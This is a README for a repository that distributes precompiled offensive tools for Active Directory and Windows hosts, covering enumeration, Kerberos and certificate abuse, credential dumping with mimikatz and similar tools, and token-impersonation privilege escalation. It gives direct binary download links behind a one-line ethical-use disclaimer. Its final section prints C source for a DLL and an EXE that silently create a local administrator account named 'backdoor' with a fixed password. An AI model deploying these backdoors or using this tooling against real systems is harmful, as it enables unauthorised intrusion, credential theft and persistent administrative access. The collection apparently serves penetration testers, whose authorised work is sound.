# Precompiled Binaries & AD Toolset

Collection of useful tools, scripts and pre-compiled binaries for enumerating and exploiting Active Directory environments or standalone Windows hosts. All binaries listed in this repository have either been downloaded from the official release page or compiled from the official source code using Visual Studio.

## Table of Contents
- [Precompiled Binaries](#precompiled-binaries)
  - [Table of Contents](#table-of-contents)
  - [Disclaimer](#disclaimer)
  - [Contents](#contents)
    - [Enumeration](#enumeration)
    - [Lateral Movement](#lateral-movement)
    - [Credential Gathering](#credential-gathering)
    - [Privilege Escalation](#privilege-escalation)
    - [Scripts](#scripts)
    - [Custom](#custom)

## Disclaimer

> [!CAUTION]
> ONLY use for ethical purposes and against targets that you are permitted to attack!

## Contents

### Enumeration

| | Name | Description | Download |
|---| --- | --- | --- |
|★| [SharpHound](https://github.com/BloodHoundAD/SharpHound) | Active directory enumeration and visualization | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Enumeration/SharpHound.exe |
|| [Seatbelt](https://github.com/GhostPack/Seatbelt) | Windows host enumeration | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Enumeration/Seatbelt.exe |
|| [SharpUp](https://github.com/GhostPack/SharpUp) | Privilege Escalation Checks | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Enumeration/SharpUp.exe |
|| [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) | Windows host enumeration | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Enumeration/winPEAS.exe | 
|| [SharpView](https://github.com/tevora-threat/SharpView) | C# Port of PowerView.ps1 | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Enumeration/SharpView.exe |
|★| [NoPowerShell](https://github.com/bitsadmin/nopowershell) | Execute PowerShell cmdlets in memory | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Enumeration/NoPowerShell.exe

### Lateral Movement

| | Name | Description | Download | 
|---| --- | --- | --- |
|★| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos ticket attacks and abuse | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/Rubeus.exe |
| | [Whisker](https://github.com/eladshamir/Whisker) |  Shadow Credential attacks | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/Whisker.exe |
| | [ADFSDump](https://github.com/mandiant/ADFSDump) | Dump information from ADFS to be used with ADFSpoof | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/ADFSDump.exe | 
|★| [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) | Interaction with SCCM for lateral movement | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/SharpSCCM.exe
|| [SpoolSample](https://github.com/leechristensen/SpoolSample) | Coerce Authentication for Unconstrained Delegation | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/SpoolSample.exe | 
|★| [RunasCS](https://github.com/antonioCoco/RunasCs) | C# Implementation of the runas command for lateral movement with valid credentials (not stealthy)  | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/RunasCs.exe | 
|| [ADModule](https://github.com/samratashok/ADModule) | Microsoft Signed DLL for importing the AD Module | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/ADModule.dll | 
|| [SharpRDP](https://github.com/0xthirteen/SharpRDP) | CLI-based lateral movement with RDP | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/SharpRDP.exe | 
|| [SharpSQL](https://github.com/mlcsec/SharpSQL) | C# Port of PowerUpSQL.ps1 for SQL Server Exploitation | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/SharpSQL.exe | 
|| [SharpMove](https://github.com/0xthirteen/SharpMove) | Lateral Movement with .NET | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/SharpMove.exe |
|| [Sharpmad](https://github.com/Kevin-Robertson/Sharpmad) | MachineAccountQuota and DNS Exploitation | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/Sharpmad.exe |

#### GPO Abuse

|| Name | Description | Download | 
|---| --- | --- | --- |
|| [SharpGPO](https://github.com/Dliv3/SharpGPO)  | Group Policy modification and editing | https://github.com/jakobfriedl/precompiled-binaries/blob/main/LateralMovement/GPOAbuse/SharpGPO.exe |
|| [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) | Group Policy exploitation and abuse | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/GPOAbuse/SharpGPOAbuse.exe |

#### Certificate Abuse

|| Name | Description | Download | 
|---| --- | --- | --- |
|| [Certify](https://github.com/GhostPack/Certify) |  Certificate abuse and enumeration | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/CertificateAbuse/Certify.exe |
|| [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) | Certificate abuse | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/CertificateAbuse/PassTheCert.exe |
|| [ForgeCert](https://github.com/GhostPack/ForgeCert) | Certificate forging | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/CertificateAbuse/ForgeCert.exe |

####  Azure AD Abuse

|| Name | Description | Download | 
|---| --- | --- | --- |
|| [ADSyncDecrypt](https://github.com/dirkjanm/adconnectdump) | Extract and decrypt Azure AD credentials | https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/AzureAD/ADSyncDecrypt.exe |
|★| [AzureAD_Decrypt_MSOL](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c) | Dump and extract Azure AD credentials |  https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/AzureAD/AzureAD_Decrypt_MSOL.ps1 |


### Credential Gathering

| | Name | Description | Download |
| --- | --- | --- | --- |
|| [mimikatz](https://github.com/ParrotSec/mimikatz) | Credential dumping and ticket attacks | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Credentials/mimikatz.exe | 
|| [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) | Credential gathering | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Credentials/SharpDPAPI.exe |
|★| [SharpChrome](https://github.com/GhostPack/SharpDPAPI) | Credential gathering (specifically from Chrome) | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Credentials/SharpChrome.exe |
|| [SharpKatz](https://github.com/b4rtik/SharpKatz) | C# Port of mimikatz | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Credentials/SharpKatz.exe |
|| [SharpLAPS](https://github.com/swisskyrepo/SharpLAPS) | Dump LAPS passwords | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Credentials/SharpLAPS.exe | 
|| [BetterSafetyKatz](https://github.com/Flangvik/BetterSafetyKatz) | Run latest mimikatz in memory | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Credentials/BetterSafetyKatz.exe |
|| [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) | Dump GMSA passwords | https://github.com/jakobfriedl/precompiled-binaries/raw/main/Credentials/GMSAPasswordReader.exe | 

### Privilege Escalation

|| Name | Description | Download |
|---| --- | --- | --- |
|| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) | Token Impersonation, SeImpersonatePrivilege | https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/Token/PrintSpoofer64.exe |
|| [NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit) | Token Impersonation, SeImpersonatePrivilege | https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/Token/NetworkServiceExploit.exe |
|| [GodPotato](https://github.com/BeichenDream/GodPotato) | Token Impersonation, SeImpersonatePrivilege | https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/Token/GodPotato.exe |
|| [JuicyPotato](https://github.com/ohpe/juicy-potato) | Token Impersonation, SeImpersonatePrivilege | https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/Token/JuicyPotato.exe |
|★| [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) | Token Impersonation, SeImpersonatePrivilege | https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/Token/SharpEfsPotato.exe |
|| [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) | Universal Local Privilege Escalation in Domains where LDAP signing is not enforced | https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/KrbRelayUp.exe |
|| [KrbRelay](https://github.com/cube0x0/KrbRelay) | Privilege Escalation by relaying Kerberos from DCOM connection (Manual alternative to KrbRelayUp) | https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/KrbRelay/KrbRelay.exe |

### Scripts
|| Name | Description | Download | 
|---| --- | --- | --- |
|★| [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) | Enumeration |  https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/PowerView.ps1 |
|★| [Powermad](https://github.com/Kevin-Robertson/Powermad) | MachineAccountQuota and DNS Exploitation |  https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/Powermad.ps1 |
|| [Inveigh](https://github.com/Kevin-Robertson/Inveigh) | MitM Attacks & Spoofing |  https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/Inveigh.ps1 |
|| [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) | Windows Privilege Escalation |  https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/PowerUp.ps1 |
|| [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) | SQL Server Enumeration and Exploitation |  https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/PowerUpSQL.ps1 |
|| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) | LAPS Password dumping |  https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/LAPSToolkit.ps1 |

### Custom 
[SimpleBackdoorAdmin.dll](https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/SimpleBackdoorAdmin.dll)

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user backdoor Password123! /add");
  	    i = system ("net localgroup administrators backdoor /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

[SimpleBackdoorAdmin.exe](https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/SimpleBackdoorAdmin.exe)
```c
#include <stdlib.h>

int main ()
{
  system("net user backdoor Password123! /add");
  system("net localgroup administrators backdoor /add");

  return 0;
}
```

